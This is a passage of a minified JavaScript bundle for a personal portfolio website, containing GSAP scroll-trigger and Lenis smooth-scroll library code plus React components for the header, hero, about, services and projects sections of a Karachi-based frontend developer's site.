          (n.start + -1e6 * (n.vars.refreshPriority || 0))
        );
      }
  );
}),
  (b.observe = function (t) {
    return new Ue(t);
  }),
  (b.normalizeScroll = function (t) {
    if (typeof t > "u") return Gt;
    if (!0 === t && Gt) return Gt.enable();
    if (!1 === t) return Gt && Gt.kill();
    var e = t instanceof Ue ? t : xw(t);
    return (
      Gt && Gt.target === e.target && Gt.kill(), Ii(e.target) && (Gt = e), e
    );
  }),
  (b.core = {
    _getVelocityProp: Rf,
    _inputObserver: e_,
    _scrollers: J,
    _proxies: er,
    bridge: {
      ss: function () {
        Sn || Fi("scrollStart"), (Sn = Et());
      },
      ref: function () {
        return ft;
      },
    },
  }),
  W1() && A.registerPlugin(b);
class ww {
  advance(e) {
    var n;
    if (!this.isRunning) return;
    let r = !1;
    if (this.lerp)
      (this.value =
        ((i = this.value),
        (o = this.to),
        (1 - (s = 1 - Math.exp(-60 * this.lerp * e))) * i + s * o)),
        Math.round(this.value) === this.to &&
          ((this.value = this.to), (r = !0));
    else {
      this.currentTime += e;
      const l = ra(0, this.currentTime / this.duration, 1);
      r = l >= 1;
      const u = r ? 1 : this.easing(l);
      this.value = this.from + (this.to - this.from) * u;
    }
    var i, o, s;
    null == (n = this.onUpdate) || n.call(this, this.value, { completed: r }),
      r && this.stop();
  }
  stop() {
    this.isRunning = !1;
  }
  fromTo(
    e,
    n,
    { lerp: r = 0.1, duration: i = 1, easing: o = (l) => l, onUpdate: s }
  ) {
    (this.from = this.value = e),
      (this.to = n),
      (this.lerp = r),
      (this.duration = i),
      (this.easing = o),
      (this.currentTime = 0),
      (this.isRunning = !0),
      (this.onUpdate = s);
  }
}
function i0(t, e) {
  let n;
  return function () {
    let r = arguments,
      i = this;
    clearTimeout(n),
      (n = setTimeout(function () {
        t.apply(i, r);
      }, e));
  };
}
class Sw {
  constructor(e, n) {
    (this.onWindowResize = () => {
      (this.width = window.innerWidth), (this.height = window.innerHeight);
    }),
      (this.onWrapperResize = () => {
        (this.width = this.wrapper.clientWidth),
          (this.height = this.wrapper.clientHeight);
      }),
      (this.onContentResize = () => {
        const r =
          this.wrapper === window ? document.documentElement : this.wrapper;
        (this.scrollHeight = r.scrollHeight),
          (this.scrollWidth = r.scrollWidth);
      }),
      (this.wrapper = e),
      (this.content = n),
      this.wrapper === window
        ? (window.addEventListener("resize", this.onWindowResize, !1),
          this.onWindowResize())
        : ((this.wrapperResizeObserver = new ResizeObserver(
            i0(this.onWrapperResize, 100)
          )),
          this.wrapperResizeObserver.observe(this.wrapper),
          this.onWrapperResize()),
      (this.contentResizeObserver = new ResizeObserver(
        i0(this.onContentResize, 100)
      )),
      this.contentResizeObserver.observe(this.content),
      this.onContentResize();
  }
  destroy() {
    var e, n;
    window.removeEventListener("resize", this.onWindowResize, !1),
      null == (e = this.wrapperResizeObserver) || e.disconnect(),
      null == (n = this.contentResizeObserver) || n.disconnect();
  }
  get limit() {
    return {
      x: this.scrollWidth - this.width,
      y: this.scrollHeight - this.height,
    };
  }
}
let t_ = () => ({
  events: {},
  emit(t, ...e) {
    let n = this.events[t] || [];
    for (let r = 0, i = n.length; r < i; r++) n[r](...e);
  },
  on(t, e) {
    var n;
    return (
      (null != (n = this.events[t]) && n.push(e)) || (this.events[t] = [e]),
      () => {
        var r;
        this.events[t] =
          null == (r = this.events[t]) ? void 0 : r.filter((i) => e !== i);
      }
    );
  },
});
class kw {
  constructor(
    e,
    { wheelMultiplier: n = 1, touchMultiplier: r = 2, normalizeWheel: i = !1 }
  ) {
    (this.onTouchStart = (o) => {
      const { clientX: s, clientY: l } = o.targetTouches
        ? o.targetTouches[0]
        : o;
      (this.touchStart.x = s),
        (this.touchStart.y = l),
        (this.lastDelta = { x: 0, y: 0 });
    }),
      (this.onTouchMove = (o) => {
        const { clientX: s, clientY: l } = o.targetTouches
            ? o.targetTouches[0]
            : o,
          u = -(s - this.touchStart.x) * this.touchMultiplier,
          a = -(l - this.touchStart.y) * this.touchMultiplier;
        (this.touchStart.x = s),
          (this.touchStart.y = l),
          (this.lastDelta = { x: u, y: a }),
          this.emitter.emit("scroll", {
            type: "touch",
            deltaX: u,
            deltaY: a,
            event: o,
          });
      }),
      (this.onTouchEnd = (o) => {
        this.emitter.emit("scroll", {
          type: "touch",
          inertia: !0,
          deltaX: this.lastDelta.x,
          deltaY: this.lastDelta.y,
          event: o,
        });
      }),
      (this.onWheel = (o) => {
        let { deltaX: s, deltaY: l } = o;
        this.normalizeWheel && ((s = ra(-100, s, 100)), (l = ra(-100, l, 100))),
          (s *= this.wheelMultiplier),
          (l *= this.wheelMultiplier),
          this.emitter.emit("scroll", {
            type: "wheel",
            deltaX: s,
            deltaY: l,
            event: o,
          });
      }),
      (this.element = e),
      (this.wheelMultiplier = n),
      (this.touchMultiplier = r),
      (this.normalizeWheel = i),
      (this.touchStart = { x: null, y: null }),
      (this.emitter = t_()),
      this.element.addEventListener("wheel", this.onWheel, { passive: !1 }),
      this.element.addEventListener("touchstart", this.onTouchStart, {
        passive: !1,
      }),
      this.element.addEventListener("touchmove", this.onTouchMove, {
        passive: !1,
      }),
      this.element.addEventListener("touchend", this.onTouchEnd, {
        passive: !1,
      });
  }
  on(e, n) {
    return this.emitter.on(e, n);
  }
  destroy() {
    (this.emitter.events = {}),
      this.element.removeEventListener("wheel", this.onWheel, { passive: !1 }),
      this.element.removeEventListener("touchstart", this.onTouchStart, {
        passive: !1,
      }),
      this.element.removeEventListener("touchmove", this.onTouchMove, {
        passive: !1,
      }),
      this.element.removeEventListener("touchend", this.onTouchEnd, {
        passive: !1,
      });
  }
}
class Cw {
  constructor({
    direction: e,
    gestureDirection: n,
    mouseMultiplier: r,
    smooth: i,
    wrapper: o = window,
    content: s = document.documentElement,
    wheelEventsTarget: l = o,
    smoothWheel: u = null == i || i,
    smoothTouch: a = !1,
    syncTouch: c = !1,
    syncTouchLerp: p = 0.1,
    touchInertiaMultiplier: f = 35,
    duration: d,
    easing: v = (k) => Math.min(1, 1.001 - Math.pow(2, -10 * k)),
    lerp: g = d ? null : 0.1,
    infinite: T = !1,
    orientation: m = e ?? "vertical",
    gestureOrientation: h = n ?? "vertical",
    touchMultiplier: _ = 1,
    wheelMultiplier: y = r ?? 1,
    normalizeWheel: C = !1,
  } = {}) {
    (this.onVirtualScroll = ({
      type: k,
      inertia: S,
      deltaX: E,
      deltaY: P,
      event: N,
    }) => {
      if (N.ctrlKey) return;
      const I = "touch" === k,
        L = "wheel" === k;
      if (
        ("vertical" === this.options.gestureOrientation && 0 === P) ||
        ("horizontal" === this.options.gestureOrientation && 0 === E) ||
        (I &&
          "vertical" === this.options.gestureOrientation &&
          0 === this.scroll &&
          !this.options.infinite &&
          P <= 0) ||
        N.composedPath().find((Y) =>
          null == Y || null == Y.hasAttribute
            ? void 0
            : Y.hasAttribute("data-lenis-prevent")
        )
      )
        return;
      if (this.isStopped || this.isLocked) return void N.preventDefault();
      if (
        ((this.isSmooth =
          ((this.options.smoothTouch || this.options.syncTouch) && I) ||
          (this.options.smoothWheel && L)),
        !this.isSmooth)
      )
        return (this.isScrolling = !1), void this.animate.stop();
      N.preventDefault();
      let X = P;
      "both" === this.options.gestureOrientation
        ? (X = Math.abs(P) > Math.abs(E) ? P : E)
        : "horizontal" === this.options.gestureOrientation && (X = E);
      const W = I && this.options.syncTouch,
        $ = I && S && Math.abs(X) > 1;
      $ && (X = this.velocity * this.options.touchInertiaMultiplier),
        this.scrollTo(
          this.targetScroll + X,
          Ff({ programmatic: !1 }, W && { lerp: $ ? this.syncTouchLerp : 0.4 })
        );
    }),
      (this.onScroll = () => {
        if (!this.isScrolling) {
          const k = this.animatedScroll;
          (this.animatedScroll = this.targetScroll = this.actualScroll),
            (this.velocity = 0),
            (this.direction = Math.sign(this.animatedScroll - k)),
            this.emit();
        }
      }),
      e &&
        console.warn(
          "Lenis: `direction` option is deprecated, use `orientation` instead"
        ),
      n &&
        console.warn(
          "Lenis: `gestureDirection` option is deprecated, use `gestureOrientation` instead"
        ),
      r &&
        console.warn(
          "Lenis: `mouseMultiplier` option is deprecated, use `wheelMultiplier` instead"
        ),
      i &&
        console.warn(
          "Lenis: `smooth` option is deprecated, use `smoothWheel` instead"
        ),
      (window.lenisVersion = "1.0.12"),
      (o !== document.documentElement && o !== document.body) || (o = window),
      (this.options = {
        wrapper: o,
        content: s,
        wheelEventsTarget: l,
        smoothWheel: u,
        smoothTouch: a,
        syncTouch: c,
        syncTouchLerp: p,
        touchInertiaMultiplier: f,
        duration: d,
        easing: v,
        lerp: g,
        infinite: T,
        gestureOrientation: h,
        orientation: m,
        touchMultiplier: _,
        wheelMultiplier: y,
        normalizeWheel: C,
      }),
      (this.dimensions = new Sw(o, s)),
      this.rootElement.classList.add("lenis"),
      (this.velocity = 0),
      (this.isStopped = !1),
      (this.isSmooth = u || a),
      (this.isScrolling = !1),
      (this.targetScroll = this.animatedScroll = this.actualScroll),
      (this.animate = new ww()),
      (this.emitter = t_()),
      this.options.wrapper.addEventListener("scroll", this.onScroll, {
        passive: !1,
      }),
      (this.virtualScroll = new kw(l, {
        touchMultiplier: _,
        wheelMultiplier: y,
        normalizeWheel: C,
      })),
      this.virtualScroll.on("scroll", this.onVirtualScroll);
  }
  destroy() {
    (this.emitter.events = {}),
      this.options.wrapper.removeEventListener("scroll", this.onScroll, {
        passive: !1,
      }),
      this.virtualScroll.destroy();
  }
  on(e, n) {
    return this.emitter.on(e, n);
  }
  off(e, n) {
    var r;
    this.emitter.events[e] =
      null == (r = this.emitter.events[e]) ? void 0 : r.filter((i) => n !== i);
  }
  setScroll(e) {
    this.isHorizontal
      ? (this.rootElement.scrollLeft = e)
      : (this.rootElement.scrollTop = e);
  }
  emit() {
    this.emitter.emit("scroll", this);
  }
  reset() {
    (this.isLocked = !1),
      (this.isScrolling = !1),
      (this.velocity = 0),
      this.animate.stop();
  }
  start() {
    (this.isStopped = !1), this.reset();
  }
  stop() {
    (this.isStopped = !0), this.animate.stop(), this.reset();
  }
  raf(e) {
    const n = e - (this.time || e);
    (this.time = e), this.animate.advance(0.001 * n);
  }
  scrollTo(
    e,
    {
      offset: n = 0,
      immediate: r = !1,
      lock: i = !1,
      duration: o = this.options.duration,
      easing: s = this.options.easing,
      lerp: l = !o && this.options.lerp,
      onComplete: u = null,
      force: a = !1,
      programmatic: c = !0,
    } = {}
  ) {
    if (!this.isStopped || a) {
      if (["top", "left", "start"].includes(e)) e = 0;
      else if (["bottom", "right", "end"].includes(e)) e = this.limit;
      else {
        var p;
        let f;
        if (
          ("string" == typeof e
            ? (f = document.querySelector(e))
            : null != (p = e) && p.nodeType && (f = e),
          f)
        ) {
          if (this.options.wrapper !== window) {
            const v = this.options.wrapper.getBoundingClientRect();
            n -= this.isHorizontal ? v.left : v.top;
          }
          const d = f.getBoundingClientRect();
          e = (this.isHorizontal ? d.left : d.top) + this.animatedScroll;
        }
      }
      if ("number" == typeof e) {
        if (
          ((e += n),
          (e = Math.round(e)),
          this.options.infinite
            ? c && (this.targetScroll = this.animatedScroll = this.scroll)
            : (e = ra(0, e, this.limit)),
          r)
        )
          return (
            (this.animatedScroll = this.targetScroll = e),
            this.setScroll(this.scroll),
            this.reset(),
            this.emit(),
            void (null == u || u())
          );
        if (!c) {
          if (e === this.targetScroll) return;
          this.targetScroll = e;
        }
        this.animate.fromTo(this.animatedScroll, e, {
          duration: o,
          easing: s,
          lerp: l,
          onUpdate: (f, { completed: d }) => {
            i && (this.isLocked = !0),
              (this.isScrolling = !0),
              (this.velocity = f - this.animatedScroll),
              (this.direction = Math.sign(this.velocity)),
              (this.animatedScroll = f),
              this.setScroll(this.scroll),
              c && (this.targetScroll = f),
              d &&
                (i && (this.isLocked = !1),
                requestAnimationFrame(() => {
                  this.isScrolling = !1;
                }),
                (this.velocity = 0),
                null == u || u()),
              this.emit();
          },
        });
      }
    }
  }
  get rootElement() {
    return this.options.wrapper === window
      ? this.options.content
      : this.options.wrapper;
  }
  get limit() {
    return this.isHorizontal
      ? this.dimensions.limit.x
      : this.dimensions.limit.y;
  }
  get isHorizontal() {
    return "horizontal" === this.options.orientation;
  }
  get actualScroll() {
    return this.isHorizontal
      ? this.rootElement.scrollLeft
      : this.rootElement.scrollTop;
  }
  get scroll() {
    return this.options.infinite
      ? ((this.animatedScroll % (e = this.limit)) + e) % e
      : this.animatedScroll;
    var e;
  }
  get progress() {
    return 0 === this.limit ? 1 : this.scroll / this.limit;
  }
  get isSmooth() {
    return this.__isSmooth;
  }
  set isSmooth(e) {
    this.__isSmooth !== e &&
      (this.rootElement.classList.toggle("lenis-smooth", e),
      (this.__isSmooth = e));
  }
  get isScrolling() {
    return this.__isScrolling;
  }
  set isScrolling(e) {
    this.__isScrolling !== e &&
      (this.rootElement.classList.toggle("lenis-scrolling", e),
      (this.__isScrolling = e));
  }
  get isStopped() {
    return this.__isStopped;
  }
  set isStopped(e) {
    this.__isStopped !== e &&
      (this.rootElement.classList.toggle("lenis-stopped", e),
      (this.__isStopped = e));
  }
}
function Tw({ sectionRefs: t }) {
  const e = K.useRef(null),
    n = K.useRef(null),
    r = K.useRef(null),
    i = bt.timeline();
  return (
    bt.registerPlugin(b),
    K.useEffect(() => {
      const o = new Cw();
      requestAnimationFrame(function s(l) {
        o.raf(l), requestAnimationFrame(s);
      });
    }),
    K.useEffect(() => {
      i.to(e.current, { y: 0, duration: 3, delay: 0.5, ease: "power4.inOut" });
    }),
    K.useEffect(() => {
      t.forEach((o) => {
        b.create({
          trigger: o,
          start: "top 375px",
          end: "bottom 300px",
          animation: bt
            .timeline()
            .to(e.current, { color: "#DDDDD5" })
            .to(r.current, { backgroundColor: "#D1D1C7", color: "#0E0E0C" }, 0)
            .to(".bg-secondary-100", { backgroundColor: "#0E0E0C" }, 0),
          toggleActions: "restart reverse restart reverse",
        });
      });
    }),
    w.jsxs("header", {
      ref: e,
      className:
        "fixed top-0 z-50 flex w-full -translate-y-full items-center justify-between bg-secondary-100 px-5 py-3",
      children: [
        w.jsx("a", {
          href: "#hero",
          "aria-label": "Logo",
          className: "z-50",
          children: w.jsxs("svg", {
            ref: n,
            width: "80",
            height: "45",
            viewBox: "0 0 121 45",
            fill: "currentColor",
            xmlns: "./images/black.SVG",
            children: [
              w.jsx("path", {
                d: "./images/black.SVG",
              }),
              w.jsx("path", {
                fillRule: "evenodd",
                clipRule: "evenodd",
                d: "./images/black.SVG",
              }),
            ],
          }),
        }),
        w.jsxs("nav", {
          className: " space-x-7 font-grotesk text-body-3 sm:block",
          children: [
            w.jsxs("a", {
              href: "#about",
              className: "group relative hidden md:inline-block",
              children: [
                w.jsx("span", { children: "about" }),
                w.jsx("span", {
                  className:
                    "absolute bottom-0 left-0 h-[0.125em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                }),
              ],
            }),
            w.jsxs("a", {
              href: "#services",
              className: "group relative hidden md:inline-block",
              children: [
                w.jsx("span", { children: "services" }),
                w.jsx("span", {
                  className:
                    "absolute bottom-0 left-0 h-[0.125em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                }),
              ],
            }),
            w.jsxs("a", {
              href: "#works",
              className: "group relative hidden md:inline-block",
              children: [
                w.jsx("span", { children: "projects" }),
                w.jsx("span", {
                  className:
                    "absolute bottom-0 left-0 h-[0.125em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                }),
              ],
            }),
            w.jsx("a", {
              ref: r,
              className: "button group relative hover:bg-transparent",
              href: "#contact",
              children: w.jsxs("span", {
                className: "relative w-fit",
                children: [
                  w.jsx("span", {
                    className:
                      "absolute bottom-2 h-[0.15em] w-0 bg-secondary-700 opacity-90 duration-300 ease-out group-hover:w-full",
                  }),
                  w.jsx("span", { children: "Let's Talk." }),
                ],
              }),
            }),
          ],
        }),
      ],
    })
  );
}
const Ew = "./images/heroimg-64242f08.webp";
function Pw() {
  const t = K.useRef(null),
    e = K.useRef(null),
    n = K.useRef([]),
    r = K.useRef(null),
    i = K.useRef(null);
  return (
    K.useEffect(() => {
      bt.timeline({ repeat: -1 }).from(r.current, {
        translateX: -40,
        duration: 1.5,
        ease: "power4.inOut",
      });
    }, []),
    K.useEffect(() => {
      bt.timeline()
        .from(e.current, { scale: 1.3, duration: 3.25, ease: "power3.inOut" })
        .from(
          t.current,
          { scale: 2, duration: 3.2, ease: "power4.inOut" },
          "-=3.1"
        )
        .to(n.current, { y: 0, duration: 2, ease: "power4.inOut" }, "-=2.5")
        .from(i.current, { opacity: 0, duration: 1, ease: "out" }, "-=2");
    }, []),
    w.jsxs("section", {
      id: "hero",
      className:
        "hero relative flex w-full h-screen select-none items-center justify-center",
      "aria-label": "hero",
      children: [
        w.jsxs("div", {
          className:
            "z-10 flex flex-col  w-full items-center text-title 2xl:text-[10vw] 2xl:space-y-16 font-bold  uppercase text-accent-300",
          children: [
            w.jsx("div", {
              className: "title 2xl:py-16",
              children: w.jsx("h1", {
                ref: (o) => (n.current[0] = o),
                className: "translate-y-96 overflow-visible",
                children: "Hey, I'm Moiz",
              }),
            }),
            w.jsx("div", {
              className: " title 2xl:py-16",
              children: w.jsx("h1", {
                ref: (o) => (n.current[1] = o),
                className:
                  "translate-y-96 font-outline-3 md:font-outline-4 text-transparent overflow-visible",
                children: "Hey, I'm Moiz",
              }),
            }),
            w.jsx("div", {
              className: " title 2xl:py-16",
              children: w.jsx("h1", {
                ref: (o) => (n.current[2] = o),
                className: "translate-y-96",
                children: "Hey, I'm Moiz",
              }),
            }),
          ],
        }),
        w.jsx("div", {
          ref: e,
          className: "absolute mx-auto  w-[55%] overflow-hidden rounded-md",
          children: w.jsx("img", {
            ref: t,
            className:
              " scale-110 aspect-[11/16] sm:aspect-[5/6] md:aspect-[7/7] rounded-md opacity-50 lg:aspect-[11/9] w-full h-auto",
            src: Ew,
            alt: "Abstract cubic background image.",
          }),
        }),
        w.jsxs("div", {
          ref: i,
          className:
            "absolute bottom-12 right-0 flex flex-col items-center justify-center space-y-8",
          children: [
            w.jsx("span", {
              className: " rotate-90 text-body-3",
              children: "scroll",
            }),
            w.jsx("div", {
              className: "relative h-1 w-10 rotate-90 overflow-hidden",
              children: w.jsx("span", {
                ref: r,
                className:
                  "absolute h-[0.08em] w-10 translate-x-10 bg-accent-300",
              }),
            }),
          ],
        }),
      ],
    })
  );
}
function Nw({ forwardedRef: t }) {
  return w.jsx("section", {
    ref: t,
    id: "about",
    className:
      "select-none flex my-20 md:my-[12%] py-10 flex-col items-center justify-center overflow-hidden nav-change",
    "aria-label": "",
    children: w.jsx("div", {
      className: "flex w-full items-center space-x-20",
      children: w.jsx("h1", {
        className:
          "text-heading-1 font-medium text-secondary-400 leading-[1.25em] md:leading-[1.08em]",
        children:
          "I create elevating digital experiences that inspire and connect with people through development and design.",
      }),
    }),
  });
}
const Mw = "images/profile-0fa7ed83.JPG";
function o0() {
  return w.jsx("div", {
    children: w.jsx("svg", {
      className: "hidden sm:block sm:scale-125 xl:scale-[200%]",
      width: "20",
      height: "20",
      viewBox: "0 0 32 16",
      fill: "none",
      xmlns: "http://www.w3.org/2000/svg",
      children: w.jsx("path", {
        fillRule: "evenodd",
        clipRule: "evenodd",
        d: "M1.39876e-06 -2.79753e-06C6.26248e-07 8.83656 7.16352 16 16 16C24.8366 16 32 8.83656 32 0L1.39876e-06 -2.79753e-06Z",
        fill: "#8C8C73",
      }),
    }),
  });
}
function Ta({ title: t }) {
  return w.jsx(w.Fragment, {
    children: w.jsx("div", {
      className: "section-heading select-none",
      children: w.jsxs("div", {
        className:
          "heading flex translate-y-56 items-center justify-center space-x-[3%]",
        children: [
          w.jsx(o0, {}),
          w.jsx("h2", {
            className:
              "w-fit text-5xl sm:text-heading-2 font-medium uppercase text-secondary-600",
            children: t,
          }),
          w.jsx(o0, {}),
        ],
      }),
    }),
  });
}
function Ow() {
  const t = K.useRef(null),
    e = K.useRef(null),
    n = K.useRef(null),
    r = K.useRef(null);
  return (
    K.useEffect(() => {
      b.create({
        trigger: e.current,
        start: "top 400px",
        animation: bt
          .timeline()
          .to(
            n.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0
          )
          .to(
            r.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0.2
          ),
        toggleActions: "play none none none",
      }),
        b.refresh();
    }, [e]),
    w.jsxs("section", {
      ref: e,
      "aria-label": "about me",
      children: [
        w.jsx(Ta, { title: "about me" }),
        w.jsxs("div", {
          className:
            "mt-10 flex flex-col items-start gap-8 md:flex-row lg:gap-10 ",
          children: [
            w.jsx("div", {
              className: "top-28 overflow-hidden rounded-md md:sticky md:w-1/2",
              children: w.jsx("img", {
                ref: t,
                loading: "lazy",
                className:
                  "aspect-square h-auto w-full rounded-md object-cover object-center md:aspect-auto",
                src: Mw,
                width: "600",
                height: "800",
                alt: "portrait image of Moiz standing in front of a tree and foliage",
              }),
            }),
            w.jsx("div", {
              className: "top-20 sm:sticky md:top-28 lg:top-32 md:w-1/2",
              children: w.jsxs("div", {
                className: "w-full space-y-4 2xl:space-y-10",
                children: [
                  w.jsx("h3", {
                    ref: n,
                    className:
                      "translate-y-10 text-heading-3 2xl:text-7xl font-semibold leading-tight opacity-0",
                    children: "A brief intro, who am I?",
                  }),
                  w.jsxs("p", {
                    ref: r,
                    className:
                      " translate-y-10 text-body-1 2xl:text-4xl opacity-0",
                    children: [
                      "I am an independent frontend developer, UI/UX designer and creator based in Karachi, Pakistan.",
                      w.jsx("br", {}),
                      w.jsx("br", {}),
                      "I specialize in crafting elevated, intuitive, and minimalistic designs for startups and small businesses to help them stand out in the digital landscape with a powerful impact. 😎",
                      w.jsx("br", {}),
                      w.jsx("br", {}),
                      "When I am not developing or designing, I enjoy learning about frontend development, productivity and designs.",
                      " ",
                    
                    ],
                  }),
                ],
              }),
            }),
          ],
        }),
      ],
    })
  );
}
function s0({ title: t, description: e, items: n }) {
  const r = K.useRef(null),
    i = K.useRef(null),
    o = K.useRef(null),
    s = K.useRef(null),
    l = K.useRef(null);
  return (
    K.useEffect(() => {
      b.create({
        trigger: r.current,
        start: "150px bottom",
        animation: bt
          .timeline()
          .to(
            i.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0
          )
          .to(
            o.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0.2
          )
          .to(
            l.current,
            { width: "100%", ease: "power4.inOut", duration: 1.5 },
            0.2
          )
          .to(
            s.current,
            { opacity: 1, y: 0, ease: "power4.out", duration: 1.25 },
            0.5
          ),
        toggleActions: "play none none none",
      }),
        b.refresh();
    }, [r]),
    w.jsxs("div", {
      ref: r,
      className: " mt-10 grid grid-cols-1 gap-5 md:grid-cols-2 md:gap-24",
      children: [
        w.jsxs("div", {
          className: "space-y-6",
          children: [
            w.jsxs("div", {
              className: "space-y-3 2xl:space-y-10",
              children: [
                w.jsx("h3", {
                  ref: i,
                  className:
                    "text-heading-3 2xl:text-7xl font-semibold leading-tight  translate-y-10 opacity-0",
                  children: t,
                }),
                w.jsx("p", {
                  ref: o,
                  className:
                    "max-w-md xl:max-w-2xl text-body-1 2xl:text-3xl  translate-y-10 opacity-0",
                  children: e,
                }),
              ],
            }),
            w.jsx("div", {
              ref: l,
              className: "h-1 w-0 bg-accent-100 opacity-50 md:hidden",
            }),
          ],
        }),
        w.jsx("div", {
          ref: s,
          className:
            " select-none leading-[2.3rem] text-secondary-500 md:leading-[2.5rem] lg:leading-[3.4rem]  translate-y-10 opacity-0",
          children: n.map((u, a) =>
            w.jsx(
              "p",
              {
                className:
                  "font-general text-special 2xl:text-7xl font-extrabold ",
                children: u,
              },
              a
            )
          ),
        }),
      ],
    })
  );
}
function Rw() {
  return w.jsxs("section", {
    id: "services",
    className: "my-[10%]",
    "aria-label": "services",
    children: [
      w.jsx(Ta, { title: "services" }),
      w.jsxs("div", {
        className: "space-y-14",
        children: [
          w.jsx(s0, {
            title: "my expertises.",
            description:
              "I focus on all things design and web related. With each of my\n          services, my goal is to deliver an impactful and elevating\n          digital experience for everyone.",
            items: [
              "Web Development",
              "Web Design",
              "Animated Design",
              "UI/UX Design",
            ],
          }),
          w.jsx(s0, {
            title: "my digital tool box.",
            description:
              "These are my go to tech stack to make any projects happen. I am always eager of learning more about my current stack, and new technologies that could expand my horizons.",
            items: [
              "JavaScript",
              "HTML",
              "CSS",
              "GSAP",
              "Locomotive",
              "TailwindCSS",
            ],
          }),
        ],
      }),
    ],
  });
}
const Dw = "./images/work-4.JPG",
  Lw = "./images/work-5.JPG",
  zw = "./images/work-3.JPG",
  jw = "./images/work-1.JPG",
  Iw = "./images/work-2.JPG";
function as({ name: t, img: e, alt: n, type: r, link: i, year: o, tools: s }) {
  return w.jsxs("div", {
    children: [
      w.jsx("a", {
        target: "_blank",
        rel: "noreferrer",
        href: i,
        className:
          "img group inline-block overflow-hidden duration-200 ease-linear hover:rounded-3xl",
        children: w.jsx("img", {
          className: "w-screen duration-700 ease-in-out group-hover:scale-105",
          src: e,
          alt: n,
          width: "800",
          height: "600",
        }),
      }),
      w.jsxs("div", {
        className: "mt-4",
        children: [
          w.jsxs("div", {
            className: "flex space-x-2 mb-3",
            children: [
              w.jsx("p", {
                className:
                  "rounded-full bg-transparent border border-secondary-600 flex justify-center items-center px-4 py-1 text-secondary-600 text-body-4 2xl:text-3xl",
                children: o,
              }),
              w.jsx("p", {
                className:
                  "rounded-full bg-transparent border border-secondary-600 flex justify-center items-center px-4 py-1 text-secondary-600 text-body-4 2xl:text-3xl",
                children: s,
              }),
            ],
          }),
          w.jsxs("div", {
            className: "2xl:space-y-3",
            children: [
              w.jsx("h3", {
                className:
                  "text-works-title 2xl:text-5xl font-medium uppercase text-primary-200",
                children: t,
              }),
              w.jsx("p", {
                className:
                  "text-body-2 2xl:text-4xl font-light text-primary-400",
                children: r,
              }),
            ],
          }),
        ],
      }),
    ],
  });
}
function Aw({ forwardedRef: t }) {
  return w.jsxs("section", {
    ref: t,
    id: "works",
    className: "nav-change overflow-hidden my-[10%]",
    children: [
      w.jsx(Ta, { title: "Projects" }),
      w.jsxs("div", {
        className: "mt-10 grid grid-cols-1 gap-16 gap-y-10 md:grid-cols-12",
        children: [
          w.jsx("div", {
            className: " col-span-1 md:col-span-12",
            children: w.jsx(as, {
              link: "https://codewithmoiz.github.io/Magma/",
              img: Dw,
              alt: "Magma builders website mockup",
              name: "Magma Builders website",
              type: "Web Design • Frontend Development",
              year: "2023",
              tools: "HTML • CSS • JavaScript • GSAP • Locomotive",
            }),
          }),
          w.jsx("div", {
            className: "col-span-1 pt-0 md:col-span-7 md:pt-16",
            children: w.jsx(as, {
              link: "https://codewithmoiz.github.io/TwoGood/",
              img: Lw,
              alt: "TwoGood clone",
              name: "TwoGood site CLONE",
              type: "Frontend Development",
              year: "2023",
              tools: "HTML • CSS • JavaScript • GSAP • Locomotive",
            }),
          }),
          w.jsx("div", {
            className: "col-span-1 pt-0 md:col-span-5 md:pt-80",
            children: w.jsx(as, {
              link: "https://firegym-1234.web.app/",
              img: zw,
              alt: "Fire GYM project",
              name: "Fire GYM",
              type: "Web Design • Frontend Development",
              year: "2023",
              tools: "HTML • CSS • Bootstrap",
            }),
          }),
          w.jsx("div", {
            className: "col-span-1 h-fit pt-0 md:col-span-8 md:pt-20",
            children: w.jsx(as, {
              link: "https://codewithmoiz.github.io/Sidcup-Golf/",
              img: jw,
              alt: "Sidcup family golf",
              name: "Sidcup family golf clone",
              type: "Frontend Development",
              year: "2023",
              tools: "HTML • CSS • JavaScript • GSAP",
            }),
          }),
          w.jsx("div", {
            className: "col-span-1 h-fit md:col-span-4",
            children: w.jsx(as, {
              link: "https://islamic-center.surge.sh/",
              img: Iw,
              alt: "Islamic centre",
              name: "Islamic centre",
              type: "Frontend Development",
              year: "2023",
              tools: "HTML • CSS • Bootstrap",
            }),
          }),
        ],
      }),
    ],
  });
}
const Vs = /^[a-z0-9]+(-[a-z0-9]+)*$/,
  Ea = (t, e, n, r = "") => {
    const i = t.split(":");
    if ("@" === t.slice(0, 1)) {
      if (i.length < 2 || i.length > 3) return null;
      r = i.shift().slice(1);
    }
    if (i.length > 3 || !i.length) return null;
    if (i.length > 1) {
      const l = i.pop(),
        u = i.pop(),
        a = { provider: i.length > 0 ? i[0] : r, prefix: u, name: l };
      return e && !yu(a) ? null : a;
    }
    const o = i[0],
      s = o.split("-");
    if (s.length > 1) {
      const l = { provider: r, prefix: s.shift(), name: s.join("-") };
      return e && !yu(l) ? null : l;
    }
    if (n && "" === r) {
      const l = { provider: r, prefix: "", name: o };
      return e && !yu(l, n) ? null : l;
    }
    return null;
  },
  yu = (t, e) =>
    !!t &&
    !(
      ("" !== t.provider && !t.provider.match(Vs)) ||
      !((e && "" === t.prefix) || t.prefix.match(Vs)) ||
      !t.name.match(Vs)
    ),
  n_ = Object.freeze({ left: 0, top: 0, width: 16, height: 16 }),
  ia = Object.freeze({ rotate: 0, vFlip: !1, hFlip: !1 }),
  ap = Object.freeze({ ...n_, ...ia }),
  Uf = Object.freeze({ ...ap, body: "", hidden: !1 });
function Fw(t, e) {
  const n = {};
  !t.hFlip != !e.hFlip && (n.hFlip = !0),
    !t.vFlip != !e.vFlip && (n.vFlip = !0);
  const r = ((t.rotate || 0) + (e.rotate || 0)) % 4;
  return r && (n.rotate = r), n;
}
function l0(t, e) {
  const n = Fw(t, e);
  for (const r in Uf)
    r in ia
      ? r in t && !(r in n) && (n[r] = ia[r])
      : r in e
      ? (n[r] = e[r])
      : r in t && (n[r] = t[r]);
  return n;
}
function Uw(t, e) {
  const n = t.icons,
    r = t.aliases || Object.create(null),
    i = Object.create(null);
  return (
